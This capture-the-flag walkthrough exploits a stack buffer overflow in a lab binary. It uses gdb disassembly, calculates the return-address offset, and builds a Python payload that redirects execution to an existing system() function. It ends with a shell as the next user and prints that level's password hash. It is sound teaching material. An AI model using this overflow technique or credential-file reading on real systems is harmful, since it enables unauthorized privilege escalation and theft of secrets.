# level1 walkthrough
Given 32 bit elf binary. Disassemble it via gdb:

    (gdb) set disassembly-flavor intel
    (gdb) disass *main
    Dump of assembler code for function main:
    0x08048480 <+0>:	push   ebp
    0x08048481 <+1>:	mov    ebp,esp
    0x08048483 <+3>:	and    esp,0xfffffff0
    0x08048486 <+6>:	sub    esp,0x50
    0x08048489 <+9>:	lea    eax,[esp+0x10]
    0x0804848d <+13>:	mov    DWORD PTR [esp],eax
    0x08048490 <+16>:	call   0x8048340 <gets@plt>
    0x08048495 <+21>:	leave  
    0x08048496 <+22>:	ret    
    End of assembler dump.

We can certainly obfuscate gets because it reads into buffer without size control.
We can see that gets function called with some buffer allocated on stack, so we can perform stack overflow attack.
If we provide more data input to the gets function than buffer capacity, then we would be able to overwrite return address from caller function (buffer allocates inside main).
But overwriting return address would not be useful on it's own, we also need some malicious code inside our binary.
If we look around with "info" command we would find defined but not used "run" function.

    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x080482f8  _init
    0x08048340  gets
    0x08048340  gets@plt
    0x08048350  fwrite
    0x08048350  fwrite@plt
    0x08048360  system
    0x08048360  system@plt
    0x08048370  __gmon_start__
    0x08048370  __gmon_start__@plt
    0x08048380  __libc_start_main
    0x08048380  __libc_start_main@plt
    0x08048390  _start
    0x080483c0  __do_global_dtors_aux
    0x08048420  frame_dummy
    0x08048444  run
    0x08048480  main
    0x080484a0  __libc_csu_init
    0x08048510  __libc_csu_fini
    0x08048512  __i686.get_pc_thunk.bx
    0x08048520  __do_global_ctors_aux
    0x0804854c  _fini

Lets disassemble this function:

    (gdb) disass run
    Dump of assembler code for function run:
    0x08048444 <+0>:	push   ebp
    0x08048445 <+1>:	mov    ebp,esp
    0x08048447 <+3>:	sub    esp,0x18
    0x0804844a <+6>:	mov    eax,ds:0x80497c0
    0x0804844f <+11>:	mov    edx,eax
    0x08048451 <+13>:	mov    eax,0x8048570
    0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
    0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
    0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
    0x0804846a <+38>:	mov    DWORD PTR [esp],eax
    0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
    0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
    0x08048479 <+53>:	call   0x8048360 <system@plt>
    0x0804847e <+58>:	leave
    0x0804847f <+59>:	ret

It turns out our binary already contains malicious function which we can abuse.
Now we need to find offset from the beginning of buffer allocated on stack to the return address.
First lets find out main function return address, for that we need to examine frame at the beginning of main function:

    (gdb) info frame
    Stack level 0, frame at 0xbffff710:
    eip = 0x8048480 in main; saved eip 0xb7e454d3
    Arglist at unknown address.
    Locals at unknown address, Previous frame's sp is 0xbffff710
    Saved registers:
    eip at 0xbffff70c

Return address value contains in saved eip register "0xb7e454d3".
Next we need to find this value inside our stack after buffer allocation and before gets call:

    (gdb) x/24x $sp
    0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
    0xbffff6c0:	0x080484a0	0x0804978c	0x00000001	0x08048321
    0xbffff6d0:	0xb7fd13e4	0x00000016	0x0804978c	0x080484c1
    0xbffff6e0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
    0xbffff6f0:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
    0xbffff700:	0x080484a0	0x00000000	0x00000000	0xb7e454d3

After that we need to find our buffer address. On top of the stack should be stored buffer address pointer (before gets call).
So the address of our buffer is "0xbffff6c0", now if we count number of addresses from the beginning of buffer address to the return address and multiply it by 4 (one address is four bytes long) 
then we would get offset from the beginning of gets buffer to the main function return address (76 bytes).
Finally we can overwrite main function return address with run function address by providing to the gets 76 bytes of random data and 4 bytes of run function address:

    level1@RainFall:~$ python -c 'print("a" * 76 + "44840408".decode("hex"))' > /tmp/level1/sample

We can use python to generate such string, also we need to convert address of run function to little endian (simple byte swap).
Now if we run our binary and give generated file as an input we would get:

    level1@RainFall:~$ ./level1 < /tmp/level1/sample
    Good... Wait what?
    Segmentation fault (core dumped)

Turns out that executed by system call shell tries to read stdin and closes immediately because it's receiving EOF.
We can bypass this behavior by letting stdin open using cat:

    level1@RainFall:~$ cat /tmp/level1/sample - | ./level1
    Good... Wait what?
    whoami
    level2
    cat /home/user/level2/.pass
    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77